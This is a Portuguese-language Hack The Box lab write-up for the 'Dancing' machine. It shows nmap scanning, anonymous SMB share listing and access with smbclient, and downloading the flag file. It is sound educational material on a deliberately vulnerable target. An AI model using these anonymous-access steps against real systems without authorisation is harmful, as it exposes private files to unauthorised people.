# Hack The Box — Dancing

## Objetivo

Explorar a máquina `Dancing` no Starting Point da Hack The Box, utilizando o protocolo SMB para acessar compartilhamentos de arquivos e encontrar a flag.

## O que aprendi

Neste lab, aprendi o funcionamento básico do protocolo SMB em ambientes Windows.

Também pratiquei:

* Identificação de portas abertas com Nmap.
* Reconhecimento do serviço SMB.
* Listagem de compartilhamentos SMB.
* Acesso anônimo a shares.
* Navegação em pastas compartilhadas.
* Download de arquivos usando `get`.

## Reconhecimento

Primeiro, conectei minha Kali Linux à VPN da Hack The Box.

Depois testei se a máquina alvo estava acessível:

```bash
ping 10.129.90.4
```

Como o alvo respondeu, continuei com a enumeração usando Nmap:

```bash
nmap -sV -sC 10.129.90.4
```

O scan indicou portas relacionadas ao SMB, como:

```text
139/tcp open netbios-ssn
445/tcp open microsoft-ds
```

A porta `445` é um forte indicativo de SMB, protocolo muito usado em sistemas Windows para compartilhamento de arquivos e pastas na rede.

## O que é SMB?

SMB significa **Server Message Block**.

Ele é usado principalmente em redes Windows para permitir o compartilhamento de:

* Arquivos
* Pastas
* Impressoras
* Recursos de rede

Neste lab, eu não acessei o sistema Windows inteiro. Eu acessei apenas uma pasta compartilhada exposta via SMB.

A ideia é parecida com acessar uma pasta compartilhada de outro computador na rede.

## Enumeração dos compartilhamentos

Para listar os compartilhamentos disponíveis, utilizei o `smbclient`:

```bash
smbclient -N -L //10.129.90.4
```

Explicação do comando:

```text
smbclient = ferramenta Linux para acessar SMB
-L = lista os compartilhamentos disponíveis
-N = tenta acessar sem senha
```

O servidor retornou os seguintes shares:

```text
ADMIN$
C$
IPC$
WorkShares
```

Ao todo, existiam 4 compartilhamentos.

## Análise dos shares

Os shares encontrados foram:

```text
ADMIN$     → compartilhamento administrativo
C$         → disco C administrativo
IPC$       → comunicação interna do Windows
WorkShares → pasta compartilhada de trabalho
```

Os shares `ADMIN$` e `C$` geralmente exigem privilégios administrativos.

O share mais interessante era:

```text
WorkShares
```

porque parecia ser uma pasta real de arquivos compartilhados.

## Acesso ao share

Acessei o compartilhamento `WorkShares` com:

```bash
smbclient //10.129.90.4/WorkShares -N
```

Após conectar, o prompt mudou para:

```text
smb: \>
```

Isso indica que eu estava dentro do ambiente SMB, navegando nos arquivos compartilhados.

## Navegação no SMB

Dentro do SMB, os comandos são parecidos com FTP:

```bash
ls
cd nome_da_pasta
get arquivo.txt
exit
```

Listei os arquivos e pastas disponíveis:

```bash
ls
```

Foram encontradas pastas como:

```text
Amy.J
James.P
```

Entrei nas pastas para procurar arquivos interessantes:

```bash
cd Amy.J
ls
```

e também:

```bash
cd ..
cd James.P
ls
```

## Captura da flag

Após encontrar o arquivo da flag, usei o comando `get` para baixar o arquivo para minha Kali:

```bash
get nome_do_arquivo.txt
```

O comando `get` é necessário porque, no SMB, eu estou acessando um compartilhamento remoto. O arquivo ainda está no servidor Windows, então preciso baixá-lo para minha máquina local antes de ler com comandos Linux.

Depois saí do SMB:

```bash
exit
```

E li o arquivo localmente:

```bash
cat nome_do_arquivo.txt
```

Assim consegui visualizar a flag e finalizar o lab.

## Por que usamos GET?

No lab `Dancing`, não obtivemos um terminal remoto da máquina Windows.

Diferente do lab `Meow`, onde acessamos o sistema via Telnet, aqui tivemos acesso apenas a uma pasta compartilhada via SMB.

Por isso, comandos como:

```bash
cat arquivo.txt
```

não funcionam diretamente dentro do SMB.

Primeiro precisamos baixar o arquivo:

```bash
get arquivo.txt
```

Depois lemos o conteúdo localmente:

```bash
cat arquivo.txt
```

## Conclusão

O lab demonstrou uma falha de configuração em um compartilhamento SMB.

O servidor Windows possuía um share acessível sem autenticação, permitindo que qualquer usuário na rede listasse pastas e baixasse arquivos.

Em um ambiente real, isso seria um risco de segurança, pois arquivos internos poderiam ficar expostos para usuários não autorizados.
